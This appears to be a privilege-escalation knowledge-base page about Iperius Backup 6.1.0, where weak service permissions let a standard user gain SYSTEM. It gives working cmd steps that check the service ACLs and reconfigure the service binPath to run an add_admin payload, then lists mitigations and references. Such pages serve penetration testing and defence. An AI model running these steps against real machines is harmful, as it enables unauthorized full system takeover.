# Iperius Backup 6.1.0 - Privilege Escalation

- **Application**: Iperius Backup

- **Version**: 6.1.0  

- **Vulnerability Type**: Local Privilege Escalation  

- **Risk Level**: High  

- **Access Required**: Local  

A vulnerability in **Iperius Backup version 6.1.0** allows a local attacker to execute arbitrary code with **SYSTEM** or **Administrator** privileges, leading to a full compromise of the affected system.


## Exploitation Details

The vulnerability is caused by improper permission handling within the Iperius Backup service. A local attacker can exploit this flaw to:

- Inject and execute malicious code

- Escalate privileges from a standard user to **SYSTEM**  

- Gain full administrative control of the system  

Public exploits are available and documented on public vulnerability databases.


## How the exploit works

Iperius Backup installs a service that runs as **SYSTEM**, and version 6.1.0 leaves the service configuration or its binary/working directory writable by standard users — the [Insecure Service Permissions(binPath)](Services-Exploitation/Insecure-Service-Permissions(binPath).md) / [Insecure File Permissions Service Executable Files Path](Services-Exploitation/Insecure-File-Permissions-Service-Executable-Files-Path.md) class. A local user redirects what the SYSTEM service executes to their own payload and restarts it (or waits for the scheduled backup) to run as SYSTEM.

## Exploitation

```cmd
:: 1. confirm the service and its weak configuration
sc qc "Iperius Backup Service"
accesschk.exe -uwcqv "Users" "Iperius Backup Service" /accepteula   :: SERVICE_CHANGE_CONFIG?
icacls "C:\Program Files (x86)\Iperius Backup\"                     :: writable binary?

:: 2a. if binPath is reconfigurable: point it at a payload and restart
sc config "Iperius Backup Service" binpath= "C:\Windows\Temp\add_admin.exe"
sc stop "Iperius Backup Service" & sc start "Iperius Backup Service"

:: 2b. if the binary is writable: overwrite it with your payload, then restart
```

The public PoC (EDB-46863) supplies a crafted executable; confirm with `whoami` → `nt authority\system`.

## Mitigation Steps

### 1. Update Software

- Download and install the latest patched version from the official vendor website:

  - https://www.iperiusbackup.com/


### 2. Restrict Local Access

- Ensure only trusted users have local or remote access to systems running Iperius Backup.

- Limit RDP and console access where possible.


### 3. Audit and Monitor

- Review Windows Event Logs for:

  - Unexpected service behavior
  
  - Suspicious child processes spawned by backup services

- Monitor for unauthorized privilege escalation attempts.


### 4. Apply Least Privilege Principle

- Avoid running backup software with unnecessary permissions.

- Ensure standard users cannot modify service binaries, configuration files, or service paths.

## References

- Exploit-DB:

  - https://www.exploit-db.com/exploits/46863

- Iperius Backup Official Website:

  - https://www.iperiusbackup.com/

## Related
- [Insecure Service Permissions(binPath)](Services-Exploitation/Insecure-Service-Permissions(binPath).md) — same weak-service-permission class
- [Insecure File Permissions Service Executable Files Path](Services-Exploitation/Insecure-File-Permissions-Service-Executable-Files-Path.md) — writable service binary abuse
- [Services Exploitation](Services-Exploitation/Services-Exploitation.md) — broader service exploitation context
- [Privilege Escalation Tools](Privilege-Escalation-Tools.md) — detect vulnerable services
